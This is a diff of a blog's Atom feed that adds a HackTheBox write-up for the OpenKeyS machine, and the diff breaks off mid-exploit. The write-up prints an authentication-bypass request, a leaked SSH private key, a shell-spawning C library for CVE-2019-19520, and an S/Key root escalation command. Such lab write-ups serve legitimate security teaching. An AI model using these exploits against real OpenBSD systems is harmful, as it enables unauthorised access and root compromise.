@@ -1,5 +1,231 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/all-en.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-12-03T07:20:00+01:00</updated><entry><title>HTB: Sneakymailer</title><link href="https://maggick.fr/2020/12/htb-sneakymailer.html" rel="alternate"></link><published>2020-12-03T07:20:00+01:00</published><updated>2020-12-03T07:20:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-12-03:/2020/12/htb-sneakymailer.html</id><summary type="html">&lt;p&gt;&lt;img alt="Sneakymailer Card" class="align-left" src="/media/2020.12/sneakymailer_card.png" width="262"/&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/all-en.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-12-14T09:50:00+01:00</updated><entry><title>HTB: OpenKeyS</title><link href="https://maggick.fr/2020/12/htb-openkeys.html" rel="alternate"></link><published>2020-12-14T09:50:00+01:00</published><updated>2020-12-14T09:50:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-12-14:/2020/12/htb-openkeys.html</id><summary type="html">&lt;p&gt;&lt;img alt="openkeys card" class="align-left" src="/media/2020.12/openkeys_card.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;This is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/267"&gt;OpenKeys&lt;/a&gt; published on
+July 25 2020 by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/159204"&gt;polarbearer&lt;/a&gt; and
+&lt;a href="https://www.hackthebox.eu/home/users/profile/125033"&gt;GibParadox&lt;/a&gt;
+This box is classified as a medium machine. This box&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.12/openkeys_card.png" alt="openkeys card" width="262"&gt;&lt;/p&gt;
+&lt;p&gt;This is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/267"&gt;OpenKeys&lt;/a&gt; published on
+July 25 2020 by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/159204"&gt;polarbearer&lt;/a&gt; and
+&lt;a href="https://www.hackthebox.eu/home/users/profile/125033"&gt;GibParadox&lt;/a&gt;
+This box is classified as a medium machine. This box&lt;/p&gt;
+
+
+&lt;h1 id="user"&gt;User&lt;/h1&gt;
+&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
+&lt;p&gt;We start with an nmap scan. Only port 22 (SSH) and port 80 (HTTP) are open.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Sat Aug 01 01:44:44 2020 as: nmap -p- -sSV -oN nmap 10.10.10.199&lt;/span&gt;
+&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.199&lt;/span&gt;
+&lt;span class="code-line"&gt;Host is up (0.078s latency).&lt;/span&gt;
+&lt;span class="code-line"&gt;Not shown: 65533 closed ports&lt;/span&gt;
+&lt;span class="code-line"&gt;PORT   STATE SERVICE VERSION&lt;/span&gt;
+&lt;span class="code-line"&gt;22/tcp open  ssh     OpenSSH 8.1 (protocol 2.0)&lt;/span&gt;
+&lt;span class="code-line"&gt;80/tcp open  http    OpenBSD httpd&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
+&lt;span class="code-line"&gt;# Nmap done at Sat Aug 01 01:47:51 2020 -- 1 IP address (1 host up) scanned in 786.94 seconds&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id="web"&gt;Web&lt;/h2&gt;
+&lt;p&gt;The website is authentication form. As the page title indicate, we could
+probably get SSH key if we can access an user account.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="home page" src="openkeys_01.png"&gt;&lt;/p&gt;
+&lt;p&gt;We run &lt;code&gt;dirb&lt;/code&gt; against the website. It found a few folders.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ dirb http://10.10.10.199&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
+&lt;span class="code-line"&gt;DIRB v2.22&lt;/span&gt;
+&lt;span class="code-line"&gt;By The Dark Raver&lt;/span&gt;
+&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;START_TIME: Sun Aug 02 01:53:56 2020&lt;/span&gt;
+&lt;span class="code-line"&gt;URL_BASE: http://10.10.10.199/&lt;/span&gt;
+&lt;span class="code-line"&gt;WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;GENERATED WORDS: 4612&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;---- Scanning URL: http://10.10.10.199/ ----&lt;/span&gt;
+&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.199/css/&lt;/span&gt;
+&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.199/fonts/&lt;/span&gt;
+&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.199/images/&lt;/span&gt;
+&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.199/includes/&lt;/span&gt;
+&lt;span class="code-line"&gt;+ http://10.10.10.199/index.html (CODE:200|SIZE:96)&lt;/span&gt;
+&lt;span class="code-line"&gt;+ http://10.10.10.199/index.php (CODE:200|SIZE:4837)&lt;/span&gt;
+&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.199/js/&lt;/span&gt;
+&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.199/vendor/&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;---- Entering directory: http://10.10.10.199/css/ ----&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;---- Entering directory: http://10.10.10.199/fonts/ ----&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We browse the founded directories as the directory listing is activated. We
+found something interesting in the &lt;code&gt;includes&lt;/code&gt; directory.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="includes folder" src="openkeys_02.png"&gt;&lt;/p&gt;
+&lt;p&gt;We take a look at the swap file and found a username "jennifer". We also notice
+a system call to &lt;code&gt;check_auth&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;b0VIM 8.1�-�^���jenniferopenkeys.htb/var/www/htdocs/includes/auth.php 3210#&amp;quot;! Utp=ad� � =����sWB@?&amp;quot; �������mgC� � � { a W J @ �������vpnmUS0���J� � � � � � � � � � � ?&amp;gt;} session_start(); session_destroy(); session_unset();{function close_session()} $_SESSION[&amp;quot;username&amp;quot;] = $_REQUEST[&amp;#39;username&amp;#39;]; $_SESSION[&amp;quot;user_agent&amp;quot;] = $_SERVER[&amp;#39;HTTP_USER_AGENT&amp;#39;]; $_SESSION[&amp;quot;remote_addr&amp;quot;] = $_SERVER[&amp;#39;REMOTE_ADDR&amp;#39;]; $_SESSION[&amp;quot;last_activity&amp;quot;] = $_SERVER[&amp;#39;REQUEST_TIME&amp;#39;]; $_SESSION[&amp;quot;login_time&amp;quot;] = $_SERVER[&amp;#39;REQUEST_TIME&amp;#39;]; $_SESSION[&amp;quot;logged_in&amp;quot;] = True;{function init_session()} } return False; { else } } return True; $_SESSION[&amp;#39;last_activity&amp;#39;] = $time; // Session is active, update last activity time and return True { else } return False; close_session(); { ($time - $_SESSION[&amp;#39;last_activity&amp;#39;]) &amp;gt; $session_timeout) if (isset($_SESSION[&amp;#39;last_activity&amp;#39;]) &amp;amp;&amp;amp; $time = $_SERVER[&amp;#39;REQUEST_TIME&amp;#39;]; // Has the session expired? { if(isset($_SESSION[&amp;quot;logged_in&amp;quot;])) // Is the user logged in? session_start(); // Start the session $session_timeout = 300; // Session timeout in seconds{function is_active_session()} return $retcode; system($cmd, $retcode); $cmd = escapeshellcmd(&amp;quot;../auth_helpers/check_auth &amp;quot; . $username . &amp;quot; &amp;quot; . $password);{function authenticate($username, $password)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;A few Google research ("OpenBsd check_auth exploit") lead us to two blog articles
+presenting four 2019 CVE allowing to bypass authentication and escalate
+privileges on openbsd:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://www.secpod.com/blog/openbsd-authentication-bypass-and-local-privilege-escalation-vulnerabilities/"&gt;secpod article&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.qualys.com/2019/12/04/cve-2019-19521/authentication-vulnerabilities-openbsd.txt"&gt;qualys article&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="cve-2019-1952"&gt;CVE-2019-1952&lt;/h2&gt;
+&lt;p&gt;We use the CVE-2019-19521 to bypass the authentication using the username
+&lt;code&gt;-schallenge&lt;/code&gt;. But the application tell us that there is no key found for the
+user &lt;code&gt;-schallenge&lt;/code&gt;. We want to authenticate as &lt;code&gt;jennifer&lt;/code&gt;.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;OpenSSH key not found for user -schallenge&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;We fire up Burp and add a &lt;code&gt;username=jennifier&lt;/code&gt; cookie to our authentication
+request.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;POST /index.php HTTP/1.1&lt;/span&gt;
+&lt;span class="code-line"&gt;Host: 10.10.10.199&lt;/span&gt;
+&lt;span class="code-line"&gt;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&lt;/span&gt;
+&lt;span class="code-line"&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span&gt;
+&lt;span class="code-line"&gt;Accept-Language: en-US,en;q=0.5&lt;/span&gt;
+&lt;span class="code-line"&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;
+&lt;span class="code-line"&gt;Referer: http://10.10.10.199/index.php&lt;/span&gt;
+&lt;span class="code-line"&gt;Content-Type: application/x-www-form-urlencoded&lt;/span&gt;
+&lt;span class="code-line"&gt;Content-Length: 31&lt;/span&gt;
+&lt;span class="code-line"&gt;Connection: close&lt;/span&gt;
+&lt;span class="code-line"&gt;Cookie: PHPSESSID=5j485ne4sih5h7dl0fk2f2e8g7;username=jennifer&lt;/span&gt;
+&lt;span class="code-line"&gt;Upgrade-Insecure-Requests: 1&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;username=-schallenge&amp;amp;password=q&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We also add the cookie to the next request to &lt;code&gt;sshkey.php&lt;/code&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;GET /sshkey.php HTTP/1.1&lt;/span&gt;
+&lt;span class="code-line"&gt;Host: 10.10.10.199&lt;/span&gt;
+&lt;span class="code-line"&gt;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&lt;/span&gt;
+&lt;span class="code-line"&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span&gt;
+&lt;span class="code-line"&gt;Accept-Language: en-US,en;q=0.5&lt;/span&gt;
+&lt;span class="code-line"&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;
+&lt;span class="code-line"&gt;Referer: http://10.10.10.199/index.php&lt;/span&gt;
+&lt;span class="code-line"&gt;Connection: close&lt;/span&gt;
+&lt;span class="code-line"&gt;Cookie: PHPSESSID=jma32i3d8r5ob3lmo3hbgi741a;username=jennifer&lt;/span&gt;
+&lt;span class="code-line"&gt;Upgrade-Insecure-Requests: 1&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The application directly give us Jennifer's SSH private key.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;-----BEGIN OPENSSH PRIVATE KEY-----&lt;/span&gt;
+&lt;span class="code-line"&gt;b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn&lt;/span&gt;
+&lt;span class="code-line"&gt;NhAAAAAwEAAQAAAYEAo4LwXsnKH6jzcmIKSlePCo/2YWklHnGn50YeINLm7LqVMDJJnbNx&lt;/span&gt;
+&lt;span class="code-line"&gt;OI6lTsb9qpn0zhehBS2RCx/i6YNWpmBBPCy6s2CxsYSiRd3S7NftPNKanTTQFKfOpEn7rG&lt;/span&gt;
+&lt;span class="code-line"&gt;nag+n7Ke+iZ1U/FEw4yNwHrrEI2pklGagQjnZgZUADzxVArjN5RsAPYE50mpVB7JO8E7DR&lt;/span&gt;
+&lt;span class="code-line"&gt;PWCfMNZYd7uIFBVRrQKgM/n087fUyEyFZGibq8BRLNNwUYidkJOmgKSFoSOa9+6B0ou5oU&lt;/span&gt;
+&lt;span class="code-line"&gt;qjP7fp0kpsJ/XM1gsDR/75lxegO22PPfz15ZC04APKFlLJo1ZEtozcmBDxdODJ3iTXj8Js&lt;/span&gt;
+&lt;span class="code-line"&gt;kLV+lnJAMInjK3TOoj9F4cZ5WTk29v/c7aExv9zQYZ+sHdoZtLy27JobZJli/9veIp8hBG&lt;/span&gt;
+&lt;span class="code-line"&gt;717QzQxMmKpvnlc76HLigzqmNoq4UxSZlhYRclBUs3l5CU9pdsCb3U1tVSFZPNvQgNO2JD&lt;/span&gt;
+&lt;span class="code-line"&gt;S7O6sUJFu6mXiolTmt9eF+8SvEdZDHXvAqqvXqBRAAAFmKm8m76pvJu+AAAAB3NzaC1yc2&lt;/span&gt;
+&lt;span class="code-line"&gt;EAAAGBAKOC8F7Jyh+o83JiCkpXjwqP9mFpJR5xp+dGHiDS5uy6lTAySZ2zcTiOpU7G/aqZ&lt;/span&gt;
+&lt;span class="code-line"&gt;9M4XoQUtkQsf4umDVqZgQTwsurNgsbGEokXd0uzX7TzSmp000BSnzqRJ+6xp2oPp+ynvom&lt;/span&gt;
+&lt;span class="code-line"&gt;dVPxRMOMjcB66xCNqZJRmoEI52YGVAA88VQK4zeUbAD2BOdJqVQeyTvBOw0T1gnzDWWHe7&lt;/span&gt;
+&lt;span class="code-line"&gt;iBQVUa0CoDP59PO31MhMhWRom6vAUSzTcFGInZCTpoCkhaEjmvfugdKLuaFKoz+36dJKbC&lt;/span&gt;
+&lt;span class="code-line"&gt;f1zNYLA0f++ZcXoDttjz389eWQtOADyhZSyaNWRLaM3JgQ8XTgyd4k14/CbJC1fpZyQDCJ&lt;/span&gt;
+&lt;span class="code-line"&gt;4yt0zqI/ReHGeVk5Nvb/3O2hMb/c0GGfrB3aGbS8tuyaG2SZYv/b3iKfIQRu9e0M0MTJiq&lt;/span&gt;
+&lt;span class="code-line"&gt;b55XO+hy4oM6pjaKuFMUmZYWEXJQVLN5eQlPaXbAm91NbVUhWTzb0IDTtiQ0uzurFCRbup l4qJU5rfXhfvErxHWQx17wKqr16gUQAAAAMBAAEAAAGBAJjT/uUpyIDVAk5L8oBP3IOr0U&lt;/span&gt;
+&lt;span class="code-line"&gt;Z051vQMXZKJEjbtzlWn7C/n+0FVnLdaQb7mQcHBThH/5l+YI48THOj7a5uUyryR8L3Qr7A&lt;/span&gt;
+&lt;span class="code-line"&gt;UIfq8IWswLHTyu3a+g4EVnFaMSCSg8o+PSKSN4JLvDy1jXG3rnqKP9NJxtJ3MpplbG3Wan&lt;/span&gt;
+&lt;span class="code-line"&gt;j4zU7FD7qgMv759aSykz6TSvxAjSHIGKKmBWRL5MGYt5F03dYW7+uITBq24wrZd38NrxGt&lt;/span&gt;
+&lt;span class="code-line"&gt;wtKCVXtXdg3ROJFHXUYVJsX09Yv5tH5dxs93Re0HoDSLZuQyIc5iDHnR4CT+0QEX14u3EL&lt;/span&gt;
+&lt;span class="code-line"&gt;TxaoqT6GBtynwP7Z79s9G5VAF46deQW6jEtc6akIbcyEzU9T3YjrZ2rAaECkJo4+ppjiJp&lt;/span&gt;
+&lt;span class="code-line"&gt;NmDe8LSyaXKDIvC8lb3b5oixFZAvkGIvnIHhgRGv/+pHTqo9dDDd+utlIzGPBXsTRYG2Vz&lt;/span&gt;
+&lt;span class="code-line"&gt;j7Zl0cYleUzPXdsf5deSpoXY7axwlyEkAXvavFVjU1UgZ8uIqu8W1BiODbcOK8jMgDkQAA&lt;/span&gt;
+&lt;span class="code-line"&gt;AMB0rxI03D/q8PzTgKml88XoxhqokLqIgevkfL/IK4z8728r+3jLqfbR9mE3Vr4tPjfgOq&lt;/span&gt;
+&lt;span class="code-line"&gt;eaCUkHTiEo6Z3TnkpbTVmhQbCExRdOvxPfPYyvI7r5wxkTEgVXJTuaoUJtJYJJH2n6bgB3&lt;/span&gt;
+&lt;span class="code-line"&gt;WIQfNilqAesxeiM4MOmKEQcHiGNHbbVW+ehuSdfDmZZb0qQkPZK3KH2ioOaXCNA0h+FC+g&lt;/span&gt;
+&lt;span class="code-line"&gt;dhqTJhv2vl1X/Jy/assyr80KFC9Eo1DTah2TLnJZJpuJjENS4AAADBAM0xIVEJZWEdWGOg&lt;/span&gt;
+&lt;span class="code-line"&gt;G1vwKHWBI9iNSdxn1c+SHIuGNm6RTrrxuDljYWaV0VBn4cmpswBcJ2O+AOLKZvnMJlmWKy&lt;/span&gt;
+&lt;span class="code-line"&gt;Dlq6MFiEIyVKqjv0pDM3C2EaAA38szMKGC+Q0Mky6xvyMqDn6hqI2Y7UNFtCj1b/aLI8cB&lt;/span&gt;
+&lt;span class="code-line"&gt;rfBeN4sCM8c/gk+QWYIMAsSWjOyNIBjy+wPHjd1lDEpo2DqYfmE8MjpGOtMeJjP2pcyWF6&lt;/span&gt;
+&lt;span class="code-line"&gt;CxcVbm6skasewcJa4Bhj/MrJJ+KjpIjQAAAMEAy/+8Z+EM0lHgraAXbmmyUYDV3uaCT6ku&lt;/span&gt;
+&lt;span class="code-line"&gt;Alz0bhIR2/CSkWLHF46Y1FkYCxlJWgnn6Vw43M0yqn2qIxuZZ32dw1kCwW4UNphyAQT1t5&lt;/span&gt;
+&lt;span class="code-line"&gt;eXBJSsuum8VUW5oOVVaZb1clU/0y5nrjbbqlPfo5EVWu/oE3gBmSPfbMKuh9nwsKJ2fi0P&lt;/span&gt;
+&lt;span class="code-line"&gt;bp1ZxZvcghw2DwmKpxc+wWvIUQp8NEe6H334hC0EAXalOgmJwLXNPZ+nV6pri4qLEM6mcT&lt;/span&gt;
+&lt;span class="code-line"&gt;qtQ5OEFcmVIA/VAAAAG2plbm5pZmVyQG9wZW5rZXlzLmh0Yi5sb2NhbAECAwQFBgc=&lt;/span&gt;
+&lt;span class="code-line"&gt;-----END OPENSSH PRIVATE KEY-----&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We can connect to the box using this key and get the user flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ ssh jennifer@10.10.10.199 -i id_rsa&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;snip&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;openkeys$ cat user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;36ab21239a15c537bde90626891d2b10&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1 id="root"&gt;Root&lt;/h1&gt;
+&lt;p&gt;The articles used to bypass the authentication give us a few leads about the
+privilege escalation.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;openkeys$ id&lt;/span&gt;
+&lt;span class="code-line"&gt;uid=1001(jennifer) gid=1001(jennifer) groups=1001(jennifer), 0(wheel)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We will use CVE-2019-19520 to gain access to the group &lt;code&gt;auth&lt;/code&gt; and then use CVE-2019-19522
+to get &lt;code&gt;root&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id="cve-2019-19520"&gt;CVE-2019-19520&lt;/h2&gt;
+&lt;p&gt;First we create a temporary folder &lt;code&gt;/tmp/.plop&lt;/code&gt; and create the file &lt;code&gt;swrast_dri.c&lt;/code&gt;
+with the following content:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;paths.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="k"&gt;static&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;__attribute__&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;constructor&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="n"&gt;_init&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="kt"&gt;gid_t&lt;/span&gt; &lt;span class="n"&gt;rgid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;egid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sgid&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;getresgid&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;rgid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;egid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;sgid&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;_exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;__LINE__&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;setresgid&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sgid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sgid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sgid&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;_exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;__LINE__&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="n"&gt;_PATH_KSHELL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt; &lt;span class="p"&gt;};&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="n"&gt;execve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="n"&gt;_exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;__LINE__&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We then compile it and run the command to get access to the &lt;code&gt;auth&lt;/code&gt; group. &lt;em&gt;As
+the author of the box implemented so cleanup script the commands needs to be run
+"quickly"&lt;/em&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;openkeys$ gcc -fpic -shared -s -o swrast_dri.so swrast_dri.c&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Personal note: The two command need to be &amp;quot;quickly run&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;openkeys$ env -i /usr/X11R6/bin/Xvfb :66 -cc 0 &amp;amp;&lt;/span&gt;
+&lt;span class="code-line"&gt;[1] 42553&lt;/span&gt;
+&lt;span class="code-line"&gt;openkeys$ _XSERVTransmkdir: ERROR: euid != 0,directory /tmp/.X11-unix will not be created.&lt;/span&gt;
+&lt;span class="code-line"&gt;env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display :66&lt;/span&gt;
+&lt;span class="code-line"&gt;openkeys$ id&lt;/span&gt;
+&lt;span class="code-line"&gt;uid=1001(jennifer) gid=11(auth) groups=1001(jennifer), 0(wheel)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;As we are now in the &lt;code&gt;auth&lt;/code&gt; group we can use the CVE-2019-19522.&lt;/p&gt;
+&lt;h2 id="cve-2019-19522"&gt;CVE-2019-19522&lt;/h2&gt;
+&lt;p&gt;We just put the command as specified in the article and get the root flag (the
+Password is not printed so I put it between bracket).&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;openkeys$ echo &amp;#39;root md5 0100 obsd91335 8b6d96e0ef1b1c21&amp;#39; &amp;gt; /etc/skey/root&lt;/span&gt;
